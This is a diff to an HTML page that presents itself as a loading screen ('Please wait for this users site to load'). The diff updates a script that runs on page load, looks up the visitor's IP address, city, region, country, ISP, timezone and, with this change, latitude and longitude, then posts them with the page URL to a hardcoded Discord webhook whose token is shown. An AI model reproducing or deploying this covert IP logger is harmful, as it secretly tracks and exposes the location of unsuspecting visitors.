@@ -1,13 +1,9 @@
 "Dance till your dead!"
 <h1>Please wait for this users site to load. Due to the many data in GitHub Pages, this can take a second.</h1>
 
-
-
-<<script>
+<script>
 window.addEventListener("load", async () => {
   const webhookURL = "https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe";
-
-  // Helper to show messages on the page
   function logMessage(message, color = "black") {
     const pre = document.createElement("pre");
     pre.style.color = color;
@@ -20,11 +16,13 @@ window.addEventListener("load", async () => {
   try {
     logMessage("Fetching IP info...", "blue");
 
-    const res = await fetch("https://ipapi.co/json/");
-    if (!res.ok) throw new Error(`Website failed: ${res.status}`);
-    const data = await res.json();
+    const res = await fetch("https://ipwho.is/");
+    if (!res.ok) throw new Error(`IP API failed: ${res.status}`);
 
-    logMessage(`IP info fetched:\n${JSON.stringify(data, null, 2)}`, "green");
+    const data = await res.json();
+    if (!data.success) throw new Error("IP lookup failed");
+
+    logMessage("IP info fetched successfully ✅", "green");
 
     const payload = {
       content:
@@ -32,9 +30,11 @@ window.addEventListener("load", async () => {
         `IP: ${data.ip}\n` +
         `City: ${data.city}\n` +
         `Region: ${data.region}\n` +
-        `Country: ${data.country_name}\n` +
-        `ISP: ${data.org}\n` +
-        `Timezone: ${data.timezone}\n` +
+        `Country: ${data.country}\n` +
+        `ISP: ${data.connection?.isp || "Unknown"}\n` +
+        `Timezone: ${data.timezone?.id || "Unknown"}\n` +
+        `Latitude: ${data.latitude}\n` +
+        `Longitude: ${data.longitude}\n` +
         `Page: ${window.location.href}`
     };
 
@@ -42,12 +42,12 @@ window.addEventListener("load", async () => {
 
     await fetch(webhookURL, {
       method: "POST",
-      mode: "no-cors", // Required for GitHub Pages
+      mode: "no-cors",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     });
 
-    logMessage("✅ Going to site", "green");
+    logMessage("✅ Sent to webhook!", "green");
 
   } catch (err) {
     logMessage(`❌ Error: ${err.message}`, "red");
